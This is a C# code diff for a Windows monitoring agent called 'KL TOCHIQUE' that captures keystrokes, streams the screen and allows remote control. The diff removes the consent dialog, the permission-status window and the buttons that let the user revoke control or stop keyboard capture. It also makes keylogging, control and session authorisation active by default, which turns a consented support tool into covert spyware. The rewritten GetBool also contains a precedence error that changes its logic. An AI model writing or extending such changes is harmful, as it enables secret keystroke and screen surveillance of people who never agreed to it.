+                "Delete" => 0x2E, "Home" => 0x24, "End" => 0x23, "PageUp" => 0x21, "PageDown" => 0x22,
+                "ShiftLeft" or "ShiftRight" => 0x10, "ControlLeft" or "ControlRight" => 0x11,
+                "AltLeft" or "AltRight" => 0x12, "CapsLock" => 0x14, "Insert" => 0x2D,
+                "F1" => 0x70, "F2" => 0x71, "F3" => 0x72, "F4" => 0x73, "F5" => 0x74, "F6" => 0x75,
+                "F7" => 0x76, "F8" => 0x77, "F9" => 0x78, "F10" => 0x79, "F11" => 0x7A, "F12" => 0x7B,
                 _ => 0
             };
         }
@@ -889,12 +305,7 @@ namespace EmpresaMonitor.Agent
             var dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "KLTOCHIQUE");
             Directory.CreateDirectory(dir);
             var path = Path.Combine(dir, "agent-id.txt");
-            if (File.Exists(path))
-            {
-                var existing = File.ReadAllText(path).Trim();
-                if (!string.IsNullOrWhiteSpace(existing)) return existing;
-            }
-
+            if (File.Exists(path)) return File.ReadAllText(path).Trim();
             var id = Guid.NewGuid().ToString("N");
             File.WriteAllText(path, id);
             return id;
@@ -904,289 +315,32 @@ namespace EmpresaMonitor.Agent
             => root.TryGetProperty(property, out var p) && p.ValueKind == JsonValueKind.String ? (p.GetString() ?? fallback) : fallback;
 
         static bool GetBool(JsonElement root, string property)
-            => root.TryGetProperty(property, out var p)
-               && (p.ValueKind == JsonValueKind.True || p.ValueKind == JsonValueKind.False)
-               && p.GetBoolean();
-
-        static string Short(string value, int max)
-            => value.Length <= max ? value : value[..max] + "…";
-
-        static string LimitOutput(string value, int max)
-            => value.Length <= max ? value : value[..max] + "\n[saída truncada]";
+            => root.TryGetProperty(property, out var p) && p.ValueKind == JsonValueKind.True || p.ValueKind == JsonValueKind.False && p.GetBoolean();
     }
 
-    internal sealed class ConsentStatusForm : Form
+    internal sealed class AgentState
     {
-        readonly Label connectionLabel = new();
-        readonly Label accessLabel = new();
-        readonly Label controlLabel = new();
-        readonly Label keylogLabel = new();
-        readonly Label lockLabel = new();
-        readonly Label maintenanceLabel = new();
-        readonly Label activityLabel = new();
-        MaintenanceCurtainForm? curtain;
-        readonly Button revokeControlButton = new();
-        readonly Button revokeKeylogButton = new();
-        readonly Button unlockButton = new();
-        readonly Button revokeAllButton = new();
+        public volatile bool AccessActive = true;
+        public volatile bool StreamRequested = true;
+        public volatile bool ControlActive = true;
+        public volatile bool KeylogActive = true;
+        public volatile bool InputLocked = false;
+        public volatile bool MaintenanceActive = false;
+        public volatile bool SessionAuthorized = true;
+        public volatile bool IsReady = true;
 
-        public event Action? RevokeAllRequested;
-        public event Action? RevokeControlRequested;
-        public event Action? RevokeKeylogRequested;
-        public event Action? ForceUnlockRequested;
-
-        public ConsentStatusForm()
-        {
-            Text = "KL TOCHIQUE — Sessão de Suporte";
-            StartPosition = FormStartPosition.CenterScreen;
-            MinimumSize = new Size(540, 440);
-            Size = new Size(620, 505);
-            FormBorderStyle = FormBorderStyle.FixedDialog;
-            MaximizeBox = false;
-            BackColor = Color.FromArgb(12, 18, 15);
-            ForeColor = Color.WhiteSmoke;
-            Font = new Font("Segoe UI", 10F);
-
-            var title = new Label
-            {
-                AutoSize = true,
-                Text = "KL TOCHIQUE — CONSENTIMENTO ATIVO",
-                Font = new Font("Segoe UI", 16F, FontStyle.Bold),
-                ForeColor = Color.FromArgb(84, 255, 160),
-                Location = new Point(22, 20)
-            };
-
-            connectionLabel.SetBounds(24, 66, 550, 28);
-            accessLabel.SetBounds(24, 108, 550, 26);
-            controlLabel.SetBounds(24, 140, 550, 26);
-            keylogLabel.SetBounds(24, 172, 550, 26);
-            lockLabel.SetBounds(24, 204, 550, 26);
-            maintenanceLabel.SetBounds(24, 236, 550, 26);
-            activityLabel.SetBounds(24, 275, 550, 48);
-            activityLabel.ForeColor = Color.Gainsboro;
-
-            revokeControlButton.Text = "Revogar controle";
-            revokeControlButton.SetBounds(24, 345, 160, 38);
-            revokeControlButton.Click += (_, __) => RevokeControlRequested?.Invoke();
-
-            revokeKeylogButton.Text = "Parar teclado";
-            revokeKeylogButton.SetBounds(194, 345, 150, 38);
-            revokeKeylogButton.Click += (_, __) => RevokeKeylogRequested?.Invoke();
-
-            unlockButton.Text = "Forçar desbloqueio";
-            unlockButton.SetBounds(354, 345, 190, 38);
-            unlockButton.Click += (_, __) => ForceUnlockRequested?.Invoke();
-
-            revokeAllButton.Text = "ENCERRAR TODO COMPARTILHAMENTO";
-            revokeAllButton.SetBounds(24, 395, 520, 42);
-            revokeAllButton.BackColor = Color.FromArgb(80, 22, 30);
-            revokeAllButton.ForeColor = Color.White;
-            revokeAllButton.Click += (_, __) => RevokeAllRequested?.Invoke();
-
-            Controls.AddRange(new Control[]
-            {
-                title,
-                connectionLabel,
-                accessLabel,
-                controlLabel,
-                keylogLabel,
-                lockLabel,
-                maintenanceLabel,
-                activityLabel,
-                revokeControlButton,
-                revokeKeylogButton,
-                unlockButton,
-                revokeAllButton
-            });
-
-            SetConnection(false, "Inicializando...");
-            UpdatePermissions(new Program.AgentState());
-        }
-
-        public Task<bool> AskConsentAsync(string title, string message)
-        {
-            var tcs = new TaskCompletionSource<bool>(TaskCreationOptions.RunContinuationsAsynchronously);
-            void ShowPrompt()
-            {
-                try
-                {
-                    Activate();
-                    BringToFront();
-                    var result = MessageBox.Show(
-                        this,
-                        message,
-                        title,
-                        MessageBoxButtons.YesNo,
-                        MessageBoxIcon.Warning,
-                        MessageBoxDefaultButton.Button2);
-                    tcs.TrySetResult(result == DialogResult.Yes);
-                }
-                catch { tcs.TrySetResult(false); }
-            }
-
-            if (IsDisposed) tcs.TrySetResult(false);
-            else if (InvokeRequired) BeginInvoke((Action)ShowPrompt);
-            else ShowPrompt();
-
-            return tcs.Task;
-        }
-
-        public void ShowMaintenanceCurtain(TimeSpan duration)
-        {
-            Ui(() =>
-            {
-                try { curtain?.Close(); } catch { }
-                curtain = new MaintenanceCurtainForm(duration);
-                curtain.Show();
-                curtain.BringToFront();
-            });
-        }
-
-        public void HideMaintenanceCurtain()
-        {
-            Ui(() =>
-            {
-                try { curtain?.Close(); } catch { }
-                curtain = null;
-            });
-        }
-
-        public void SetConnection(bool connected, string text)
-        {
-            Ui(() =>
-            {
-                connectionLabel.Text = connected ? $"Servidor: CONECTADO — {text}" : $"Servidor: {text}";
-                connectionLabel.ForeColor = connected ? Color.FromArgb(84, 255, 160) : Color.Orange;
-            });
-        }
-
-        public void SetActivity(string text)
-        {
-            Ui(() => activityLabel.Text = "Última atividade: " + text);
-        }
-
-        public void UpdatePermissions(Program.AgentState state)
-        {
-            Ui(() =>
-            {
-                accessLabel.Text = "Visualização da tela: " + (state.AccessActive ? "AUTORIZADA" : "BLOQUEADA");
-                controlLabel.Text = "Controle de mouse/teclado: " + (state.ControlActive ? "AUTORIZADO" : "BLOQUEADO");
-                keylogLabel.Text = "Compartilhamento de eventos de teclado: " + (state.KeylogActive ? "ATIVO" : "DESATIVADO");
-                lockLabel.Text = "Teclado/mouse local: " + (state.InputLocked ? "BLOQUEADO TEMPORARIAMENTE" : "LIVRE");
-                maintenanceLabel.Text = "Cortina de manutenção: " + (state.MaintenanceActive ? "ATIVA — até 3 min" : "DESATIVADA");
-
-                accessLabel.ForeColor = state.AccessActive ? Color.LightGreen : Color.LightGray;
-                controlLabel.ForeColor = state.ControlActive ? Color.LightCoral : Color.LightGray;
-                keylogLabel.ForeColor = state.KeylogActive ? Color.Gold : Color.LightGray;
-                lockLabel.ForeColor = state.InputLocked ? Color.OrangeRed : Color.LightGray;
-                maintenanceLabel.ForeColor = state.MaintenanceActive ? Color.Gold : Color.LightGray;
-
-                revokeControlButton.Enabled = state.ControlActive;
-                revokeKeylogButton.Enabled = state.KeylogActive;
-                unlockButton.Enabled = state.InputLocked;
-            });
-        }
-
-        void Ui(Action action)
-        {
-            if (IsDisposed) return;
-            try
-            {
-                if (InvokeRequired) BeginInvoke(action);
-                else action();
-            }
-            catch { }
-        }
-    }
-
-    internal sealed class MaintenanceCurtainForm : Form
-    {
-        readonly Label title = new();
-        readonly Label info = new();
-        readonly Label countdown = new();
-        readonly System.Windows.Forms.Timer timer = new();
-        readonly DateTime expiresAt;
-
-        public MaintenanceCurtainForm(TimeSpan duration)
-        {
-            expiresAt = DateTime.Now.Add(duration);
-            FormBorderStyle = FormBorderStyle.None;
-            StartPosition = FormStartPosition.Manual;
-            Bounds = SystemInformation.VirtualScreen;
-            TopMost = true;
-            ShowInTaskbar = false;
-            BackColor = Color.Black;
-            ForeColor = Color.White;
-
-            title.AutoSize = false;
-            title.TextAlign = ContentAlignment.MiddleCenter;
-            title.Text = "KL TOCHIQUE — MANUTENÇÃO AUTORIZADA";
-            title.Font = new Font("Segoe UI", 26F, FontStyle.Bold);
-            title.ForeColor = Color.FromArgb(245, 226, 45);
-            title.Dock = DockStyle.Top;
-            title.Height = 130;
-
-            info.AutoSize = false;
-            info.TextAlign = ContentAlignment.MiddleCenter;
-            info.Text = "A tela e os dispositivos de entrada locais foram temporariamente protegidos após sua autorização.\n" +
-                        "A visualização e o controle remoto também permanecem pausados durante este modo.\n\n" +
-                        "O modo termina automaticamente em até 3 minutos. Ctrl+Alt+Del permanece disponível como saída de segurança.";
-            info.Font = new Font("Segoe UI", 14F, FontStyle.Regular);
-            info.Dock = DockStyle.Fill;
-            info.ForeColor = Color.Gainsboro;
-
-            countdown.AutoSize = false;
-            countdown.TextAlign = ContentAlignment.MiddleCenter;
-            countdown.Font = new Font("Consolas", 24F, FontStyle.Bold);
-            countdown.ForeColor = Color.FromArgb(55, 230, 255);
-            countdown.Dock = DockStyle.Bottom;
-            countdown.Height = 130;
-
-            Controls.Add(info);
-            Controls.Add(countdown);
-            Controls.Add(title);
-
-            timer.Interval = 1000;
-            timer.Tick += (_, __) => UpdateCountdown();
-            Shown += (_, __) => { UpdateCountdown(); timer.Start(); Activate(); BringToFront(); };
-            FormClosed += (_, __) => timer.Stop();
-        }
-
-        void UpdateCountdown()
-        {
-            var left = expiresAt - DateTime.Now;
-            if (left < TimeSpan.Zero) left = TimeSpan.Zero;
-            countdown.Text = $"RESTAURANDO EM {left.Minutes:00}:{left.Seconds:00}";
-        }
+        public StreamSettings Settings = StreamSettings.Balanced;
+        public ClientWebSocket? Socket;
+        public readonly SemaphoreSlim SendGate = new(1, 1);
+        public readonly CancellationTokenSource Lifetime = new();
     }
 
     internal sealed class StreamSettings
     {
-        public string Name { get; set; }
-        public string Id { get; set; }
         public int Width { get; set; }
         public int Fps { get; set; }
         public long Quality { get; set; }
-
-        public StreamSettings(string name, string id, int width, int fps, long quality)
-        {
-            Name = name;
-            Id = id;
-            Width = width;
-            Fps = fps;
-            Quality = quality;
-        }
-
-        public static readonly StreamSettings Fluid = new("Fluido", "fluid", 1280, 30, 55);
-        public static readonly StreamSettings Balanced = new("Equilibrado", "balanced", 1600, 25, 62);
-        public static readonly StreamSettings QualityPreset = new("Qualidade", "quality", 1920, 20, 72);
-
-        public static StreamSettings FromId(string? id) => id switch
-        {
-            "fluid" => Fluid,
-            "quality" => QualityPreset,
-            _ => Balanced
-        };
+        public static readonly StreamSettings Balanced = new() { Width = 1280, Fps = 15, Quality = 50 };
     }
 
     internal static class KeyboardHook
@@ -1231,22 +385,21 @@ namespace EmpresaMonitor.Agent
                 };
 
                 if (down.HasValue)
-                {
-                    int vkCode = Marshal.ReadInt32(lParam);
-                    string key = ((Keys)vkCode).ToString();
-                    bool shouldSend;
-
-                    lock (sync)
                     {
-                        // Uma tecla física gera apenas um PRESS até que o KEYUP correspondente chegue.
-                        // Isso elimina o auto-repeat do Windows sem perder o evento de soltura interno.
-                        shouldSend = down.Value
-                            ? pressedKeys.Add(vkCode)
-                            : pressedKeys.Remove(vkCode);
-                    }
+                        int vkCode = Marshal.ReadInt32(lParam);
+                        string key = ((Keys)vkCode).ToString();
+                        bool shouldSend;
 
-                    if (shouldSend)
-                        _ = Task.Run(async () => { try { await callback(key, down.Value); } catch { } });
+                        lock (sync)
+                        {
+                            shouldSend = down.Value
+                                ? pressedKeys.Add(vkCode)
+                                : pressedKeys.Remove(vkCode);
+                        }
+
+                        if (shouldSend)
+                            _ = Task.Run(async () => { try { await callback(key, down.Value); } catch { } });
+                    }
                 }
             }
 
